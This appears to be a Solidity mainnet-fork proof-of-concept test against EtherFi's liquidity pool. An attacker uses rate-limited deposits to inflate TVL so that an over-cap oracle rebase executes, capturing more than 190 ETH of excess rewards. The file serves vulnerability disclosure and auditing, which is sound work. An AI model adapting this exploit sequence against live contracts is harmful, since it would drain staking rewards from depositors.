...
interface IDeployedEtherFiRateLimiter {
    ...
    function setCapacity(bytes32 limitId, uint64 capacity) external;
    function setRefillRate(bytes32 limitId, uint64 refillRatePerSecond) external;
    function setRemaining(bytes32 limitId, uint64 remaining) external;
...
contract OraclePositiveRebaseAsyncExitMainnetForkPoC is TestSetup, Deployed {
    ...
    function setUp() public {
        ...
        // A latest-block fork can legitimately land between publication and
        // execution. Advance only the test fixture's handled cursor so the PoC
        // begins from a synchronized boundary; no production state is changed.
        uint32 livePublished = etherFiOracleInstance.lastPublishedReportRefSlot();
        if (livePublished != etherFiAdminInstance.lastHandledReportRefSlot()) {
            uint32 livePublishedBlock = etherFiOracleInstance.lastPublishedReportRefBlock();
            bytes32 packed = vm.load(address(etherFiAdminInstance), bytes32(uint256(209)));
            uint256 value = uint256(packed) & ~uint256(0xFFFFFFFFFFFFFFFF);
            value |= uint256(livePublished);
            value |= uint256(livePublishedBlock) << 32;
            vm.store(address(etherFiAdminInstance), bytes32(uint256(209)), bytes32(value));
        }
    ...
    /// @notice A delayed but accurate report that is one basis point above the
    /// LP's positive-rebase cap is initially unexecutable. Public deposits can
    /// nevertheless raise the live TVL denominator until that same report
    /// passes, letting the depositor capture the rewards above the original cap.
    function test_liveTvlLetsAttackerBypassOriginalRebaseCapAndExtractExcessRewards()
        public
    {
        uint256 incumbentTvl = liquidityPoolInstance.getTotalPooledEther();

        _advanceSlots(uint256(20 days / 12));
        uint256 rewards = incumbentTvl * 26 / BASIS_POINTS_DENOMINATOR;
        IDeployedEtherFiOracleV10.OracleReport memory delayed = _blankReport(
            int128(int256(rewards)),
            withdrawRequestNFTInstance.lastFinalizedRequestId(),
            0
        );
        _stampAndReachConsensus(delayed);
        ...
        // executeTasks is permissionless; the attacker can probe the report itself.
        vm.prank(attacker);
        vm.expectRevert(LiquidityPool.RebaseExceedsPositiveCap.selector);
        IDeployedEtherFiAdminV10(address(etherFiAdminInstance)).executeTasks(delayed);

        uint256 requiredExecutionTvl =
            (rewards * BASIS_POINTS_DENOMINATOR + 24) / 25;
        uint256 capital = requiredExecutionTvl - incumbentTvl + 1 ether;
        bytes32 mintLimitId =
            IEETHRateLimitIds(address(eETHInstance)).EETH_MINT_LIMIT_ID();

        // TestSetup intentionally makes the global buckets unbounded for generic
        // fork tests. Restore the production upgrade configuration for this PoC.
        bytes32 burnLimitId =
            IEETHRateLimitIds(address(eETHInstance)).EETH_BURN_LIMIT_ID();
        vm.startPrank(owner);
        _deployedRateLimiter().setCapacity(mintLimitId, 30_000_000_000_000);
        _deployedRateLimiter().setRefillRate(mintLimitId, 2_083_333_333);
        _deployedRateLimiter().setRemaining(mintLimitId, 30_000_000_000_000);
        _deployedRateLimiter().setCapacity(burnLimitId, 25_000_000_000_000);
        _deployedRateLimiter().setRefillRate(burnLimitId, 1_736_111_111);
        _deployedRateLimiter().setRemaining(burnLimitId, 25_000_000_000_000);
        vm.stopPrank();

        (uint64 capacityGwei,, uint64 refillRateGweiPerSecond,) =
            _deployedRateLimiter().getLimit(mintLimitId);

        vm.deal(attacker, capital);

        uint256 depositStart = block.timestamp;
        uint256 remaining = capital;
        uint256 depositCount;
        while (remaining != 0) {
            uint256 consumable =
                uint256(_deployedRateLimiter().consumable(mintLimitId)) * 1 gwei;
            if (consumable == 0) {
                assertGt(uint256(refillRateGweiPerSecond), 0, "mint bucket cannot refill");
                uint256 neededGwei = (remaining + 1 gwei - 1) / 1 gwei;
                if (neededGwei > uint256(capacityGwei)) neededGwei = uint256(capacityGwei);
                uint256 waitSeconds =
                    (neededGwei + uint256(refillRateGweiPerSecond) - 1)
                        / uint256(refillRateGweiPerSecond);
                _advanceSlots((waitSeconds + 11) / 12 + 1);
                consumable =
                    uint256(_deployedRateLimiter().consumable(mintLimitId)) * 1 gwei;
            }

            uint256 chunk = remaining < consumable ? remaining : consumable;
            vm.prank(attacker);
            liquidityPoolInstance.deposit{value: chunk}();
            remaining -= chunk;
            depositCount++;
        }

        assertGe(
            liquidityPoolInstance.getTotalPooledEther() * 25 / BASIS_POINTS_DENOMINATOR,
            rewards,
            "live cap remains too small"
        );
        // The final deposit and this permissionless execution can be privately
        // bundled, leaving no executor cooperation or public reaction gap.
        vm.prank(attacker);
        IDeployedEtherFiAdminV10(address(etherFiAdminInstance)).executeTasks(delayed);

        uint256 rebasedBalance = eETHInstance.balanceOf(attacker);
        uint256 capturedOldRewards = rebasedBalance - capital;
        uint256 originalCap = incumbentTvl * 25 / BASIS_POINTS_DENOMINATOR;
        uint256 rewardsAboveOriginalCap = rewards - originalCap;

        emit log_named_uint("mint-bucket deposit count", depositCount);
        emit log_named_uint("mint-bucket elapsed seconds", block.timestamp - depositStart);
        emit log_named_decimal_uint("attacker capital", capital, 18);
        emit log_named_decimal_uint("reported rewards", rewards, 18);
        emit log_named_decimal_uint("excess over original cap", rewardsAboveOriginalCap, 18);
        emit log_named_decimal_uint("captured historical rewards", capturedOldRewards, 18);

        assertApproxEqAbs(capturedOldRewards, rewardsAboveOriginalCap, 3 ether);
        assertGt(capturedOldRewards, 190 ether, "economic impact is not material");

        uint256[] memory requestIds =
            _requestAllUsingCurrentWithdrawalBounds(rebasedBalance);
        uint256 reportCount = _finalizeAndClaimAllUsingCurrentLimits(requestIds);
        uint256 finalProfit = attacker.balance - capital;
        emit log_named_uint("normal finalization reports", reportCount);
        emit log_named_decimal_uint("final native-ETH profit", finalProfit, 18);
        assertGt(finalProfit, 190 ether, "native-ETH extraction is not material");
        assertApproxEqAbs(finalProfit, capturedOldRewards, 1e12);
    }
    ...
    function _advanceUntilNextReportFinalized() internal {
        // A report's refBlockTo must be strictly newer than the preceding admin
        // execution block. Production gets this progression naturally; make it
        // explicit when the test has already warped beyond the target epoch.
        uint256 minimumBlock =
            uint256(etherFiAdminInstance.lastAdminExecutionBlock()) + 2;
        if (vm.getBlockNumber() < minimumBlock) {
            _advanceSlots(minimumBlock - vm.getBlockNumber());
        }
